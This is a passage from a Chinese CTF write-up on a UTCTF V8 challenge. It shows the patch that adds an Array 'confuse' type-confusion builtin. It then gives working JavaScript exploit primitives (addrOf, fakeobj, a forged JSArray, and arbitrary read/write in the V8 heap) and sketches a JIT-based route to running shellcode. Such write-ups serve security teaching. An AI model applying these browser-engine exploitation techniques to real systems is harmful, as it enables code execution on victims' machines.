Shell::CreateOSTemplate</span><span style="color:#5eaab5">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#5eaab5">)</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  </span><span style="color:#e6cc77">}</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "d8", Shell::CreateD8Template</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-</span><br><span style="color:#FDAEB7">-  if </span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">i::v8_flags.expose_async_hooks</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7"> </span><span style="color:#e6cc77">{</span><br><span style="color:#FDAEB7">-    global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, "async_hooks",</span><br><span style="color:#FDAEB7">-                         Shell::CreateAsyncHookTemplate</span><span style="color:#5eaab5">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#5eaab5">)</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  </span><span style="color:#e6cc77">}</span><br><br><span style="color:#DBD7CAEE">   return global_template;</span><br><span style="color:#DBD7CAEE"> </span><span style="color:#d9739f">}</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -3719,10 +3676,12 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> void Shell::Initialize</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Isolate* isolate, D8Console* console,</span><br><span style="color:#DBD7CAEE">             v8::Isolate::kMessageLog</span><span style="color:#d9739f">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   </span><span style="color:#4d9375">}</span><br><br><span style="color:#85E89D">+	/*</span><br><span style="color:#DBD7CAEE">   isolate-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">SetHostImportModuleDynamicallyCallback</span><span style="color:#4d9375">(</span><br><span style="color:#DBD7CAEE">       Shell::HostImportModuleDynamically</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   isolate-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">SetHostInitializeImportMetaObjectCallback</span><span style="color:#4d9375">(</span><br><span style="color:#DBD7CAEE">       Shell::HostInitializeImportMetaObject</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#85E89D">+	*/</span><br><span style="color:#DBD7CAEE">   isolate-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">SetHostCreateShadowRealmContextCallback</span><span style="color:#4d9375">(</span><br><span style="color:#DBD7CAEE">       Shell::HostCreateShadowRealmContext</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><br><span style="color:#79B8FF">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span style="color:#DBD7CAEE">index 48249695b7b..ceb2b23e916 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/init/bootstrapper.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/init/bootstrapper.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -2571,6 +2571,9 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> void Genesis::InitializeGlobal</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Handle</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">JSGlobalObject</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> global_object,</span><br><span style="color:#DBD7CAEE">                           false</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">     SimpleInstallFunction</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">isolate_, proto, "join", Builtin::kArrayPrototypeJoin,</span><br><span style="color:#DBD7CAEE">                           1, false</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#85E89D">+    // Custom Additions </span><span style="color:#4d9375">(</span><span style="color:#85E89D">UTCTF</span><span style="color:#4d9375">)</span><br><span style="color:#85E89D">+    SimpleInstallFunction</span><span style="color:#4d9375">(</span><span style="color:#85E89D">isolate_, proto, "confuse", Builtin::kArrayConfuse,</span><br><span style="color:#85E89D">+                          0, false</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><br><span style="color:#DBD7CAEE">     </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><span style="color:#DBD7CAEE">  // Set up iterator-related properties.</span><br><span style="color:#DBD7CAEE">       DirectHandle</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">JSFunction</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> keys = InstallFunctionWithBuiltinId</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><br></code></pre></div>
<p>可以看到给了 JSArray 加了一个 <code class="inline-code">confuse</code> 方法，实现 <code class="inline-code">PACKED_DOUBLE_ELEMENTS</code> 和 <code class="inline-code">PACKED_ELEMENTS</code> 相互转化，复习一下知识点：</p>
<ul>
<li><code class="inline-code">PACKED_DOUBLE_ELEMENTS</code> -> 数组由原始 64 位双精度数组成，元素之间没有空洞（因此是 <code class="inline-code">PACKED</code>）</li>
<li><code class="inline-code">PACKED_ELEMENTS</code> ->  数组由指向其他 JS 对象的 v8 指针组成，元素之间没有空洞（因此是 <code class="inline-code">PACKED</code>）</li>
</ul>
<p>因此这个函数基本上意味着我们可以进行无限制的类型混淆，从而很轻松的构建一个 <code class="inline-code">addrOf</code> 原语和 <code class="inline-code">fakeobj</code> 原语。</p>
<p>首先构建一个 <code class="inline-code">addrOf</code> 原语用来泄漏 v8 堆中对象的地址：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">function</span><span style="color:#59873A"> addrOf</span><span style="color:#2993a3">(</span><span style="color:#B07D48">obj</span><span style="color:#2993a3">)</span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> a</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#B07D48">obj</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	a</span><span style="color:#999999">.</span><span style="color:#59873A">confuse</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	return</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48">a</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">0</span><span style="color:#a65e2b">]</span><span style="color:#999999">.</span><span style="color:#59873A">f2i</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#2F798A"> 0xffffffff</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">function</span><span style="color:#80A665"> addrOf</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">obj</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> a</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#BD976A">obj</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	a</span><span style="color:#666666">.</span><span style="color:#80A665">confuse</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	return</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A">a</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">0</span><span style="color:#d4976c">]</span><span style="color:#666666">.</span><span style="color:#80A665">f2i</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#4C9A91"> 0xffffffff</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>这个很直观，不需要过多解释。</p>
<p>然后是 <code class="inline-code">fakeobj</code>：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">function</span><span style="color:#59873A"> fakeobj</span><span style="color:#2993a3">(</span><span style="color:#B07D48">addr</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	let</span><span style="color:#B07D48"> a</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#B07D48">addr</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	a</span><span style="color:#999999">.</span><span style="color:#59873A">confuse</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	return</span><span style="color:#B07D48"> a</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">function</span><span style="color:#80A665"> fakeobj</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	let</span><span style="color:#BD976A"> a</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#BD976A">addr</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	a</span><span style="color:#666666">.</span><span style="color:#80A665">confuse</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	return</span><span style="color:#BD976A"> a</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>这个原语稍微解释下：当我们构建一个浮点数数组时，他的类型默认就是 <code class="inline-code">PACKED_DOUBLE_ELEMENTS</code>，这时调用 <code class="inline-code">confuse()</code> 变成 <code class="inline-code">PACKED_ELEMENTS</code> 后，他就对应变成了一个对象数组，这样我们之前放在数组头的 <code class="inline-code">addr</code> 就会被当作一个对象，也就是我们想要的 <code class="inline-code">fake_obj</code>。</p>
<p>接下来要拿到 v8 堆内的任意地址读写，思路是通过控制 JSArray 的 <code class="inline-code">elements</code> 来实现：构造两个数组 <code class="inline-code">arbrw_arr</code> 和 <code class="inline-code">fake_arr</code>，在 <code class="inline-code">fake_arr</code> 的 <code class="inline-code">elements</code> 内再伪造一个 JSArray 的结构，这个 <code class="inline-code">fake_arr_elements</code> 的 <code class="inline-code">elements</code> 字段修改为 <code class="inline-code">arbrw_arr</code> 的地址，使用 <code class="inline-code">fakeobj</code> 原语得到 <code class="inline-code">fake_arr_elements</code> 对应的对象 <code class="inline-code">fakeobj</code>，这样就成功伪造出了一个 <code class="inline-code">fakeobj</code> 数组，满足这个数组的 <code class="inline-code">elements</code> 指向另一个 JSArray 结构，这样修改 <code class="inline-code">fakeobj[0]</code> 相当于在修改 <code class="inline-code">arbrw_arr->elements</code>，然后再访问 <code class="inline-code">arbrw_arr[0]</code> 即可实现 v8 堆内任意读写。</p>
<p>首先构造一个数组 <code class="inline-code">fake_arr</code>：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">const</span><span style="color:#B07D48"> MAP_ADDR</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x1cb86d</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> PROPERTIES_ADDR</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x725</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> arbrw_arr</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2F798A">1.1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2.2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3.3</span><span style="color:#2993a3">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> fake_arr</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><br><span style="color:#999999">	</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">PROPERTIES_ADDR</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> |</span><span style="color:#B07D48"> MAP_ADDR</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#A0ADA0"> // 伪造好不变的字段</span><br><span style="color:#2F798A">	0x4141414141414141</span><span style="color:#AB5959">n</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#A0ADA0"> // 留出 length | elements 的空间</span><br><span style="color:#2993a3">]</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">const</span><span style="color:#BD976A"> MAP_ADDR</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x1cb86d</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> PROPERTIES_ADDR</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x725</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> arbrw_arr</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1.1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2.2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3.3</span><span style="color:#5eaab5">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> fake_arr</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><br><span style="color:#666666">	</span><span style="color:#4d9375">(</span><span style="color:#d4976c">(</span><span style="color:#BD976A">PROPERTIES_ADDR</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> |</span><span style="color:#BD976A"> MAP_ADDR</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#758575DD"> // 伪造好不变的字段</span><br><span style="color:#4C9A91">	0x4141414141414141</span><span style="color:#CB7676">n</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#758575DD"> // 留出 length | elements 的空间</span><br><span style="color:#5eaab5">]</span><span style="color:#666666">;</span><br></code></pre></div>
<p>然后完整伪造 <code class="inline-code">fake_arr</code> 里的结构：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">let</span><span style="color:#B07D48"> fake_arr_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrOf</span><span style="color:#2993a3">(</span><span style="color:#B07D48">fake_arr</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">fake_arr_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> fake_arr_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> fake_arr_elements_addr</span><span style="color:#999999"> =</span><span style="color:#B07D48"> fake_arr_addr</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x54</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> arbrw_arr_addr</span><span style="color:#999999"> =</span><span style="color:#59873A"> addrOf</span><span style="color:#2993a3">(</span><span style="color:#B07D48">arbrw_arr</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">arbrw_arr_addr =></span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> arbrw_arr_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">fake_arr</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> |</span><span style="color:#B07D48"> arbrw_arr_addr</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B07D48">fake_arr_elements_addr</span><span style="color:#999999">.</span><span style="color:#59873A">hex</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> fake_obj</span><span style="color:#999999"> =</span><span style="color:#59873A"> fakeobj</span><span style="color:#2993a3">(</span><span style="color:#B07D48">fake_arr_elements_addr</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">let</span><span style="color:#BD976A"> fake_arr_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrOf</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">fake_arr</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">fake_arr_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> fake_arr_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> fake_arr_elements_addr</span><span style="color:#666666"> =</span><span style="color:#BD976A"> fake_arr_addr</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x54</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> arbrw_arr_addr</span><span style="color:#666666"> =</span><span style="color:#80A665"> addrOf</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">arbrw_arr</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">arbrw_arr_addr =></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> arbrw_arr_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">fake_arr</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> |</span><span style="color:#BD976A"> arbrw_arr_addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">fake_arr_elements_addr</span><span style="color:#666666">.</span><span style="color:#80A665">hex</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> fake_obj</span><span style="color:#666666"> =</span><span style="color:#80A665"> fakeobj</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">fake_arr_elements_addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>实现任意读写：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">function</span><span style="color:#59873A"> write64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">where</span><span style="color:#999999">,</span><span style="color:#B07D48"> what</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">	fake_obj</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#2F798A">6</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">where</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">	arbrw_arr</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> what</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">function</span><span style="color:#59873A"> read64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">where</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">	fake_obj</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#2F798A">6</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">where</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#59873A">i2f</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	return</span><span style="color:#B07D48"> arbrw_arr</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#59873A">f2i</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">function</span><span style="color:#80A665"> write64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">where</span><span style="color:#666666">,</span><span style="color:#BD976A"> what</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">	fake_obj</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#4C9A91">6</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">where</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">	arbrw_arr</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> what</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">function</span><span style="color:#80A665"> read64</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">where</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">	fake_obj</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#4C9A91">6</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">where</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#80A665">i2f</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	return</span><span style="color:#BD976A"> arbrw_arr</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">.</span><span style="color:#80A665">f2i</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>接下来一般有三种打法：</p>
<ol>
<li>创建 wasm 函数劫持 RWX 段</li>
<li>通过 JIT 劫持 RWX 段</li>
<li>转 backing_store 获得全部内存地址空间的任意读写</li>
</ol>
<p>这里方法一实测下来失败了，原因是题目远程环境开启了 pkey 保护机制，详情参考<a href="https://groups.google.com/g/v8-reviews/c/vQyf4P407zc?pli=1" title="https://groups.google.com/g/v8-reviews/c/vQyf4P407zc?pli=1" target="_blank" rel="noopener">这里</a></p>
<p>这里用方法二打，我们不用 WASM，而是使用 JIT 创建 RWX 区域，将 shellcode 放入其中。如果 V8 中的某个函数变得“热”，JIT 引擎就会对其进行优化。根据调用次数，它会触发 Turbofan 或 Maglev。如果我们创建一个返回 shellcode 的函数，它也会被放置在 RWX 区域中，因为它需要执行 shellcode。</p>
